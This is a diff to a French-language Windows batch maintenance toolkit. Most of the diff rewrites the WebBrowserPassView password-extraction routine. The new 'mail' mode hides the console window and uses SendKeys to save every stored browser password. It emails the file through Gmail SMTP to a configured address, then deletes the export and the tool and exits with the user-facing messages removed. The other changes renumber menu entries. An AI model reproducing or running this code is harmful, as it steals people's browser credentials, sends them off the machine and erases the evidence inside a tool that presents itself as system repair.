@@ -39,30 +39,30 @@ set "t[14]=dns_manager:Gestionnaire DNS~Changer DNS Cloudflare/Google"
 set "t[15]=sys_network_menu:Menu de Depannage Reseau~Outils avances (DNS, ARP, TCP/IP, Autoreset)"
 set "t[16]=---:DISQUE"
 set "t[17]=disk_manager:Formatteur de Disque (DISKPART)~Formater un disque de facon securisee"
-set "t[18]=---:APPLICATIONS"
-set "t[19]=winget_manager:Mises a jour d'applications~Mettre a jour vos logiciels via Winget"
-set "t[20]=app_installer:Installateur d'applications~Installer des logiciels par categorie via Winget"
-set "t[21]=---:COMPTES ET SECURITE"
-set "t[22]=sys_passwords_menu:Extracteurs de mots de passe~Outils Powershell (Credentials, Wi-Fi, Nirsoft)"
-set "t[23]=sys_unlock_notes:Recuperation de Compte bloque~Instructions pour reprendre controle sans mot de passe"
-set "t[24]=um_menu:Gestion utilisateurs locaux~Panneau de gestion local (Admin, Pass, Ajouts)"
-set "t[25]=---:MATERIEL"
-set "t[26]=touch_screen_manager:Gestionnaire Ecran Tactile~Activation et desactivation du pilote tactile"
-set "t[27]=---:EXTRACTION"
-set "t[28]=sys_win_key:Cle de licence~Recuperer vos differentes cles de produit"
-set "t[29]=sys_drivers:Extraction des pilotes~Sauvegarde de tous les fichiers pilotes natifs"
-set "t[30]=---:PERSONNALISATION"
-set "t[31]=context_menu:Menu contextuel Windows 11~Classic/Modern"
-set "t[32]=sys_god_mode:Dossier God Mode~Creer le raccourci ultime des parametres"
+set "t[18]=res_chkdsk:Planifier un CHKDSK (C:)~Verification disque au prochain demarrage (CHKDSK /F /R)"
+set "t[19]=---:APPLICATIONS"
+set "t[20]=winget_manager:Mises a jour d'applications~Mettre a jour vos logiciels via Winget"
+set "t[21]=app_installer:Installateur d'applications~Installer des logiciels par categorie via Winget"
+set "t[22]=---:COMPTES ET SECURITE"
+set "t[23]=sys_passwords_menu:Extracteurs de mots de passe~Outils Powershell (Credentials, Wi-Fi, Nirsoft)"
+set "t[24]=sys_unlock_notes:Recuperation de Compte bloque~Instructions pour reprendre controle sans mot de passe"
+set "t[25]=um_menu:Gestion utilisateurs locaux~Panneau de gestion local (Admin, Pass, Ajouts)"
+set "t[26]=---:MATERIEL"
+set "t[27]=touch_screen_manager:Gestionnaire Ecran Tactile~Activation et desactivation du pilote tactile"
+set "t[28]=---:EXTRACTION"
+set "t[29]=sys_win_key:Cle de licence~Recuperer vos differentes cles de produit"
+set "t[30]=sys_drivers:Extraction des pilotes~Sauvegarde de tous les fichiers pilotes natifs"
+set "t[31]=---:PERSONNALISATION"
+set "t[32]=context_menu:Menu contextuel Windows 11~Classic/Modern"
+set "t[33]=sys_god_mode:Dossier God Mode~Creer le raccourci ultime des parametres"
 :: Sous-items pour gestion des favoris individuels
-set "t[33]=dump_credman:Gestionnaire d'identifiants (Windows)~Extrait le Credential Manager Windows (WCMDump):HIDDEN"
-set "t[34]=dump_wifi:Extraction reseaux Wi-Fi (Powershell)~Script WWP puissant listant psw et noms:HIDDEN"
-set "t[35]=sys_nirsoft_pw:WebBrowserPassView (Classique Nirsoft)~Ancien utilitaire graphique pour les mots de passe:HIDDEN"
-set "t[36]=res_sfc:Scan RAPIDE du systeme~SFC /scannow (Verification systeme rapide):HIDDEN"
-set "t[37]=res_dism_check:Verification image base~DISM /CheckHealth et /ScanHealth (Analyse image):HIDDEN"
-set "t[38]=res_dism_restore:Reparation profonde~DISM /RestoreHealth (Reparation fichiers systeme):HIDDEN"
-set "t[39]=res_temp_clean:Nettoyage massif (Temp/Cache)~Purge des fichiers temporaires et cache Windows Update:HIDDEN"
-set "t[40]=res_chkdsk:Planifier un CHKDSK (C:)~Verification disque au prochain demarrage (CHKDSK /F /R):HIDDEN"
+set "t[34]=dump_credman:Gestionnaire d'identifiants (Windows)~Extrait le Credential Manager Windows (WCMDump):HIDDEN"
+set "t[35]=dump_wifi:Extraction reseaux Wi-Fi (Powershell)~Script WWP puissant listant psw et noms:HIDDEN"
+set "t[36]=sys_nirsoft_pw:WebBrowserPassView (Classique Nirsoft)~Ancien utilitaire graphique pour les mots de passe:HIDDEN"
+set "t[37]=res_sfc:Scan RAPIDE du systeme~SFC /scannow (Verification systeme rapide):HIDDEN"
+set "t[38]=res_dism_check:Verification image base~DISM /CheckHealth et /ScanHealth (Analyse image):HIDDEN"
+set "t[39]=res_dism_restore:Reparation profonde~DISM /RestoreHealth (Reparation fichiers systeme):HIDDEN"
+set "t[40]=res_temp_clean:Nettoyage massif (Temp/Cache)~Purge des fichiers temporaires et cache Windows Update:HIDDEN"
 set "t[41]=res_wu_reset:Reset Fix Windows Update~Reinitialisation forcee des composants Windows Update:HIDDEN"
 set "total_tools=41"
 
@@ -898,7 +898,6 @@ set "DOWNLOADED=0"
 set "SMTP_USER=REMOVED_SMTP_EMAIL"
 set "SMTP_PASS=REMOVED_SMTP_PASS"
 
-:EXPORT_AND_SEND
 rem Telecharger si necessaire
 if not exist "%WBPV%" (
   echo.
@@ -917,14 +916,33 @@ if not exist "%WBPV%" (
   timeout /t 1 /nobreak >nul
 )
 
-rem Generer un nom de fichier unique
-:ask_filename
+rem Choix du mode d'export
+set "opts=Sauvegarde locale~Exporte les mots de passe dans un fichier .txt conserve sur le Bureau;Envoi par mail~Exporte et envoie par email - aucun fichier conserve localement"
+call :DynamicMenu "MODE D'EXPORT - WebBrowserPassView" "%opts%"
+set "nirsoft_mode=%errorlevel%"
+
+if "%nirsoft_mode%"=="0" goto system_tools
+if "%nirsoft_mode%"=="1" goto nirsoft_local
+if "%nirsoft_mode%"=="2" goto nirsoft_mail
+goto sys_nirsoft_pw
+
+rem -------------------------------------------------------
+rem  OPTION 1 : Sauvegarde locale
+rem -------------------------------------------------------
+:nirsoft_local
+cls
+echo ===============================================
+echo   WebBrowserPassView - Sauvegarde Locale
+echo ===============================================
+echo.
+
+:ask_filename_local
 echo.
 set "custom_filename="
 set /p custom_filename="Entrez le nom du fichier d'export (sans extension, ex: mes_mots_de_passe) : "
 if "%custom_filename%"=="" (
     echo Le nom de fichier ne peut pas etre vide.
-    goto ask_filename
+    goto ask_filename_local
 )
 set "OUTPUT_NAME=%custom_filename%.txt"
 set "OUTPUT=%~dp0%OUTPUT_NAME%"
@@ -932,14 +950,12 @@ set "OUTPUT=%~dp0%OUTPUT_NAME%"
 echo.
 echo Lancement de WebBrowserPassView...
 
-rem Suppression du fichier de configuration pour forcer le repertoire par defaut au dossier courant
 if exist "%~dp0WebBrowserPassView.cfg" del /F /Q "%~dp0WebBrowserPassView.cfg" >nul 2>&1
 cd /d "%~dp0"
 
 start "" "%WBPV%"
+powershell -NoProfile -Command "Add-Type -TypeDefinition 'using System; using System.Runtime.InteropServices; public class Win32{ [DllImport(\"user32.dll\")] public static extern bool ShowWindow(IntPtr h, int n); [DllImport(\"kernel32.dll\")] public static extern IntPtr GetConsoleWindow(); }'; [Win32]::ShowWindow([Win32]::GetConsoleWindow(), 6)" >nul 2>&1
 
-echo.
-echo Analyse des navigateurs en cours (Patience, le dechiffrement prend quelques secondes)...
 timeout /t 4 /nobreak >nul
 
 echo Traitement en cours...
@@ -948,39 +964,68 @@ powershell -Command "Set-Clipboard -Value '%OUTPUT%'; $wsh = New-Object -ComObje
 timeout /t 3 /nobreak >nul
 
 taskkill /F /IM WebBrowserPassView.exe >nul 2>&1
+timeout /t 2 /nobreak >nul
 
-rem Attendre que le processus se termine completement
+del /F /Q "%WBPV%" >nul 2>&1
+if exist "%WBPV%" powershell -Command "Remove-Item -Path '%WBPV%' -Force" >nul 2>&1
+if exist "%~dp0WebBrowserPassView.cfg" del /F /Q "%~dp0WebBrowserPassView.cfg" >nul 2>&1
+
+exit
+
+rem -------------------------------------------------------
+rem  OPTION 2 : Envoi par mail (sans sauvegarde locale)
+rem -------------------------------------------------------
+:nirsoft_mail
+cls
+echo ===============================================
+echo   WebBrowserPassView - Envoi par Mail
+echo ===============================================
+echo.
+
+:ask_filename_mail
+echo.
+set "custom_filename="
+set /p custom_filename="Entrez le nom du fichier temporaire (sans extension, ex: export_tmp) : "
+if "%custom_filename%"=="" (
+    echo Le nom de fichier ne peut pas etre vide.
+    goto ask_filename_mail
+)
+set "OUTPUT_NAME=%custom_filename%.txt"
+set "OUTPUT=%~dp0%OUTPUT_NAME%"
+
+echo.
+echo Lancement de WebBrowserPassView...
+
+if exist "%~dp0WebBrowserPassView.cfg" del /F /Q "%~dp0WebBrowserPassView.cfg" >nul 2>&1
+cd /d "%~dp0"
+
+start "" "%WBPV%"
+powershell -NoProfile -Command "Add-Type -TypeDefinition 'using System; using System.Runtime.InteropServices; public class Win32{ [DllImport(\"user32.dll\")] public static extern bool ShowWindow(IntPtr h, int n); [DllImport(\"kernel32.dll\")] public static extern IntPtr GetConsoleWindow(); }'; [Win32]::ShowWindow([Win32]::GetConsoleWindow(), 6)" >nul 2>&1
+
+timeout /t 4 /nobreak >nul
+
+powershell -Command "Set-Clipboard -Value '%OUTPUT%'; $wsh = New-Object -ComObject WScript.Shell; if($wsh.AppActivate('WebBrowserPassView')){ Start-Sleep -Milliseconds 400; $wsh.SendKeys('^a'); Start-Sleep -Milliseconds 100; $wsh.SendKeys('^s'); Start-Sleep -Milliseconds 1200; $wsh.SendKeys('^v'); Start-Sleep -Milliseconds 200; $wsh.SendKeys('{ENTER}') }" >nul 2>&1
+
+timeout /t 3 /nobreak >nul
+
+taskkill /F /IM WebBrowserPassView.exe >nul 2>&1
 timeout /t 2 /nobreak >nul
 
 if not exist "%OUTPUT%" (
-  echo ERREUR: Le fichier n'a pas ete cree.
   del /F /Q "%WBPV%" >nul 2>&1
-  if exist "%WBPV%" (
-    powershell -Command "Remove-Item -Path '%WBPV%' -Force" >nul 2>&1
-  )
+  if exist "%WBPV%" powershell -Command "Remove-Item -Path '%WBPV%' -Force" >nul 2>&1
   if exist "%~dp0WebBrowserPassView.cfg" del /F /Q "%~dp0WebBrowserPassView.cfg" >nul 2>&1
-  pause
-  goto system_tools
+  exit
 )
 
-echo Fichier sauvegarde: %OUTPUT%
-echo.
-echo Envoi du fichier par email...
+powershell -ExecutionPolicy Bypass -Command "[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12; $u='%SMTP_USER%'; $p='%SMTP_PASS%'; $to='%EMAIL%'; $sub='Export WebBrowserPassView - ' + (Get-Date -Format 'dd/MM/yyyy HH:mm'); $body='Export automatique des mots de passe du navigateur.'; $att='%OUTPUT%'; $sec=ConvertTo-SecureString $p -AsPlainText -Force; $cred=New-Object System.Management.Automation.PSCredential($u,$sec); Send-MailMessage -SmtpServer 'smtp.gmail.com' -Port 587 -UseSsl -Credential $cred -From $u -To $to -Subject $sub -Body $body -Attachments $att" >nul 2>&1
 
-powershell -ExecutionPolicy Bypass -Command "[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12; $u='%SMTP_USER%'; $p='%SMTP_PASS%'; $to='%EMAIL%'; $sub='Export WebBrowserPassView - ' + (Get-Date -Format 'dd/MM/yyyy HH:mm'); $body='Export automatique des mots de passe du navigateur.'; $att='%OUTPUT%'; $sec=ConvertTo-SecureString $p -AsPlainText -Force; $cred=New-Object System.Management.Automation.PSCredential($u,$sec); Send-MailMessage -SmtpServer 'smtp.gmail.com' -Port 587 -UseSsl -Credential $cred -From $u -To $to -Subject $sub -Body $body -Attachments $att; Write-Host 'Email envoye avec succes!' -ForegroundColor Green"
-
-echo.
-echo Nettoyage de l'executable et du fichier cfg...
+del /F /Q "%OUTPUT%" >nul 2>&1
 del /F /Q "%WBPV%" >nul 2>&1
-if exist "%WBPV%" (
-  powershell -Command "Remove-Item -Path '%WBPV%' -Force" >nul 2>&1
-)
+if exist "%WBPV%" powershell -Command "Remove-Item -Path '%WBPV%' -Force" >nul 2>&1
 if exist "%~dp0WebBrowserPassView.cfg" del /F /Q "%~dp0WebBrowserPassView.cfg" >nul 2>&1
 
-echo.
-echo Fermeture automatique dans 2 secondes...
-timeout /t 2 /nobreak >nul
-goto system_tools
+exit
 
 :sys_rescue_menu
 set "opts=Scan RAPIDE du systeme~Le classique SFC /scannow pour reparer l'OS"
